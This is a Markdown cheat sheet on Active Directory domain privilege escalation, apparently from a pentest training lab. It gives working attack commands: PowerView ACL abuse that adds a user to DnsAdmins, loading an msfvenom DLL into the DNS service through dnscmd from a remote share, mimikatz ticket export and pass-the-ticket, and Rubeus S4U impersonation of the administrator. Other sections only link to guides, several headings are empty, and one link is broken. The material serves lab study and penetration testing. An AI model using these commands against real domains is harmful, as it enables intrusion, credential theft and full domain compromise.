# Domain Privilege Escalation

> N.B.: You need a local admin access to do these attacks.

## ACL - Generic All

```powershell
Get-ObjectAcl -SamAccountName DnsAdmins -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll')}

Get-ObjectAcl -SamAccountName DnsAdmins -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-55465134614643146434643614646467'}
```
Adding yourself as a member

```powershell
Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'student1' 
Get-DomainUser -name 'student1'
Get-DomainGroup -SamAccountName DnsAdmins
```

## ACL - GenericWrite on User

## PrintNightmare (CVE-2021-34527)

## PrivEsc - DNS Admins 

[DNS Admins PrivEsc Guide by iRedTeam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
```powershell
#make a privescl.dll with msfvenom
rundll32.exe .\privesc.dll,DnsPluginInitialize

dnscmd dc.pentesting.local /config /serverlevelplungindll \\student\share\privesc.dll

Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

## DCSync Attack

* [Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=1729) 
* [DC Sync Attacks With Secretsdump.py](https://youtu.be/QfyZQDyeXjQ)

## ZeroLogon (CVE-2020-1472)

* [CrowdStrike's Guide to ZeroLogon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)
* [TheCyberMentor's Video](https://www.youtube.com/watch?v=6xMGsdD-ArI/)

## Unconstrained delegation

* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

```powershell
mimikatz# sekurlsa::tickets
mimikatz# mimikatz::tickets /export
mimikatz# kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
```


## Constrained Delegation

```powershell
PS C:\> Rubeus.exe tgtdeleg

# ticket is the base64 ticket we get with `rubeus's tgtdeleg`
Rubeus.exe s4u /ticket:doIFCDC[...]TE9DQUw= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
```

## Kerberoasting

* [Attack Tutorial: Kerberoasting](https://youtu.be/beRDcvBwTBw)
* [Active Directory - Kerberoasting by Conda](https://youtu.be/-3MxoxdzFNI)
* [Kerberoasting Explained | Kerberos Authentication](https://youtu.be/ajOr4pcx6T0)

## ASPRoasting

* [Harmjoy's Roasting AS-REPs Tutorial](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
* [CRACKING ACTIVE DIRECTORY PASSWORDS WITH AS-REP ROASTING](CRACKING ACTIVE DIRECTORY PASSWORDS WITH AS-REP ROASTING)
